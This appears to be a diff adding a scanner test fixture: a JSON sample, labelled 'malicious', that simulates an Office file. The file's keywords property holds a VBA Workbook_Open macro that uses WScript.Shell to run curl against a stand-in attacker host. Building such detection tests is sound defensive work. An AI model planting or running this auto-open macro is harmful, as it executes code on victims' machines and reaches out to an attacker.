@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::72::binary-variations::4",
+  "base_sample_id": "exp::document-office::72",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -745934699,
+  "content": "{\n  \"format\": \"office\",\n  \"coreProperties\": {\n    \"cp:keywords\": \"Private Sub Workbook_Open()\\n  CreateObject(\\\"WScript.Shell\\\").Run \\\"curl http://evil.example.com/\\\"\\nEnd Sub\\n\",\n    \"dc:creator\": \"John Doe\",\n    \"cp:lastModifiedBy\": \"Jane Smith\",\n    \"dcterms:created\": \"2026-01-15T10:30:00Z\"\n  }\n}",
+  "content_hash": "27e48bcd2137966a1ce5ecf5348087d973d5afeb88f3ae55a78acb75c0c97458",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-properties",
+  "difficulty": "advanced"
+}
